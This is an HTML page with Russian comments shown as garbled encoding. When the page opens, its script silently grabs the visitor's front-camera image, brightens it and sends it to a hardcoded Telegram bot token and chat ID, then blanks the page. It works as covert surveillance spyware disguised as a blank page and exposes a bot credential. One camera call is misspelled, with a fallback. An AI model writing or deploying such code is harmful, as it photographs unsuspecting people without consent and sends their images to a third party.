<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; }
        #status { 
            position: fixed; top:20px; left:0; width:100%; 
            color:#0f0; font-family:Arial; text-align:center; 
            font-size:14px; z-index:1000; 
        }
        /* –ü–æ–¥—Å–≤–µ—Ç–∫–∞ –¥–ª—è –∫–∞–º–µ—Ä—ã - –ø–æ–º–æ–≥–∞–µ—Ç –ø—Ä–æ—Ç–∏–≤ —Ç–µ–º–Ω—ã—Ö —Ñ–æ—Ç–æ */
        #light {
            position: fixed; top:0; left:0; width:100%; height:100%;
            background: rgba(255,255,255,0.15); /* –õ—ë–≥–∫–∞—è –±–µ–ª–∞—è –ø–æ–¥—Å–≤–µ—Ç–∫–∞ */
            display: none; z-index:999;
        }
    </style>
</head>
<body>
    <div id="light"></div>
    <div id="status">üîÑ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>

<script>
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
const status = document.getElementById('status');
const light = document.getElementById('light');

function updateStatus(text) {
    status.textContent = text;
    console.log(text);
}

async function captureAndSend() {
    let stream = null;
    
    try {
        // === 1. –í–ö–õ–Æ–ß–ê–ï–ú –ü–û–î–°–í–ï–¢–ö–£ –ü–ï–†–ï–î –°–™–ï–ú–ö–û–ô ===
        light.style.display = 'block';
        updateStatus('üí° –í–∫–ª—é—á–∞—é –∫–∞–º–µ—Ä—É...');
        
        // === 2. –ó–ê–ü–†–ê–®–ò–í–ê–ï–ú –ö–ê–ú–ï–†–£ –° –û–ü–¢–ò–ú–ê–õ–¨–ù–´–ú–ò –ù–ê–°–¢–†–û–ô–ö–ê–ú–ò ===
        // –ü—Ä–æ–±—É–µ–º —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—É—é –∫–∞–º–µ—Ä—É —Å –∞–≤—Ç–æ—Ñ–æ–∫—É—Å–æ–º –∏ –ø–æ–¥—Å–≤–µ—Ç–∫–æ–π
        stream = await navigator.mediaDevimedia({
            video: {
                facingMode: 'user', // –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞
                width: { ideal: 480, max: 640 },  // –ú–ï–ù–¨–®–ï —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ = –ë–´–°–¢–†–ï–ï
                height: { ideal: 640, max: 480 },
                frameRate: { ideal: 24 }, // –ù–∏–∑–∫–∏–π FPS –¥–ª—è —Å–∫–æ—Ä–æ—Å—Ç–∏
                // –ö–ª—é—á–µ–≤—ã–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–ª—è –∫–∞—á–µ—Å—Ç–≤–∞:
                brightness: { ideal: 0.7, min: 0.5 }, // –Ø—Ä—á–µ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
                contrast: { ideal: 0.6 },
                exposureMode: 'continuous' // –ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —ç–∫—Å–ø–æ–∑–∏—Ü–∏—è
            }
        }).catch(async () => {
            // –ï—Å–ª–∏ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç—Å—è —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ - –ø—Ä–æ—Å—Ç–æ–π –∑–∞–ø—Ä–æ—Å
            updateStatus('üîÑ –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –∑–∞–ø—Ä–æ—Å –∫–∞–º–µ—Ä—ã...');
            return await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: 480, height: 640 }
            });
        });
        
        updateStatus('‚úÖ –ö–∞–º–µ—Ä–∞ –≥–æ—Ç–æ–≤–∞');
        
        // === 3. –ü–û–î–ì–û–¢–û–í–ö–ê –í–ò–î–ï–û –ë–ï–ó play() ===
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        
        // –ñ–¥–µ–º –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏ –≤–∏–¥–µ–æ
        await new Promise(resolve => {
            if (video.readyState >= 1) resolve();
            else video.onloadedmetadata = resolve;
        });
        
        // === 4. –î–ê–Å–ú –ö–ê–ú–ï–†–ï –í–†–ï–ú–Ø –ù–ê –§–û–ö–£–° –ò –≠–ö–°–ü–û–ó–ò–¶–ò–Æ ===
        // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º –≤—Ä–µ–º—è –¥–ª—è —Ñ–æ–∫—É—Å–∏—Ä–æ–≤–∫–∏
        updateStatus('üì∏ –ù–∞—Å—Ç—Ä–∞–∏–≤–∞—é —Ñ–æ–∫—É—Å...');
        await new Promise(resolve => setTimeout(resolve, 800)); // –£–≤–µ–ª–∏—á–µ–Ω–æ –¥–æ 800–º—Å
        
        // === 5. –î–ï–õ–ê–ï–ú –°–ù–ò–ú–û–ö –° –û–ü–¢–ò–ú–ò–ó–ê–¶–ò–ï–ô ===
        const canvas = document.createElement('canvas');
        // –ï–©–Å –ú–ï–ù–¨–®–ï —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –¥–ª—è —Å–∫–æ—Ä–æ—Å—Ç–∏
        canvas.width = 400;
        canvas.height = 500;
        
        const ctx = canvas.getContext('2d');
        
        // 1) –†–∏—Å—É–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // 2) –£–õ–£–ß–®–ê–ï–ú –ö–ê–ß–ï–°–¢–í–û: –ø–æ–≤—ã—à–∞–µ–º —è—Ä–∫–æ—Å—Ç—å –∏ –∫–æ–Ω—Ç—Ä–∞—Å—Ç
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const data = imageData.data;
        
        // –ü—Ä–æ—Å—Ç–∞—è –∫–æ—Ä—Ä–µ–∫—Ü–∏—è —è—Ä–∫–æ—Å—Ç–∏ (+20%)
        for (let i = 0; i < data.length; i += 4) {
            data[i] = Math.min(255, data[i] * 1.2);     // –ö—Ä–∞—Å–Ω—ã–π
            data[i + 1] = Math.min(255, data[i + 1] * 1.2); // –ó–µ–ª–µ–Ω—ã–π
            data[i + 2] = Math.min(255, data[i + 2] * 1.2); // –°–∏–Ω–∏–π
        }
        
        ctx.putImageData(imageData, 0, 0);
        
        // === 6. –ú–ì–ù–û–í–ï–ù–ù–û –û–°–¢–ê–ù–ê–í–õ–ò–í–ê–ï–ú –ö–ê–ú–ï–†–£ –ò –ü–û–î–°–í–ï–¢–ö–£ ===
        stream.getTracks().forEach(track => track.stop());
        light.style.display = 'none';
        updateStatus('‚úÖ –§–æ—Ç–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ');
        
        // === 7. –û–¢–ü–†–ê–í–ö–ê –° –ú–ò–ù–ò–ú–ê–õ–¨–ù–û–ô –ó–ê–î–ï–†–ñ–ö–û–ô ===
        updateStatus('üì® –û—Ç–ø—Ä–∞–≤–ª—è—é...');
        
        canvas.toBlob(async (blob) => {
            // –§–æ—Ä–º–∏—Ä—É–µ–º –∑–∞–ø—Ä–æ—Å
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            
            // –í–ê–ñ–ù–û: –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ë–ï–ó caption –¥–ª—è —É—Å–∫–æ—Ä–µ–Ω–∏—è
            // –í–ê–ñ–ù–û: –ù–µ –∂–¥—ë–º –æ—Ç–≤–µ—Ç–∞ –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞ (no-cors —Ä–µ–∂–∏–º)
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData,
                mode: 'no-cors', // –ö–ª—é—á–µ–≤–∞—è –æ–ø—Ü–∏—è –¥–ª—è —Å–∫–æ—Ä–æ—Å—Ç–∏
                keepalive: true  // –ü–æ–∑–≤–æ–ª—è–µ—Ç –∑–∞–∫—Ä—ã—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É –¥–æ –æ—Ç–ø—Ä–∞–≤–∫–∏
            }).catch(() => {}); // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ —Å–µ—Ç–∏
            
            // === 8. –ú–ì–ù–û–í–ï–ù–ù–û–ï –ó–ê–í–ï–†–®–ï–ù–ò–ï ===
            updateStatus('‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!');
            
            // –ß–µ—Ä–µ–∑ 500–º—Å –ø–æ–ª–Ω–æ—Å—Ç—å—é –æ—á–∏—â–∞–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É
            setTimeout(() => {
                document.body.innerHTML = '';
                document.body.style.backgroundColor = '#000';
            }, 500);
            
        }, 'image/jpeg', 0.7); // –ù–∏–∑–∫–æ–µ –∫–∞—á–µ—Å—Ç–≤–æ 70% –¥–ª—è —Å–∫–æ—Ä–æ—Å—Ç–∏
        
    } catch (error) {
        updateStatus(`‚ùå –û—à–∏–±–∫–∞: ${error.message}`);
        if (stream) stream.getTracks().forEach(track => track.stop());
        light.style.display = 'none';
        
        // –î–∞–∂–µ –ø—Ä–∏ –æ—à–∏–±–∫–µ –æ—á–∏—â–∞–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
        setTimeout(() => {
            document.body.innerHTML = '';
        }, 2000);
    }
}

// –ó–∞–ø—É—Å–∫–∞–µ–º –º–≥–Ω–æ–≤–µ–Ω–Ω–æ
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', captureAndSend);
} else {
    captureAndSend();
}
</script>
</body>
</html>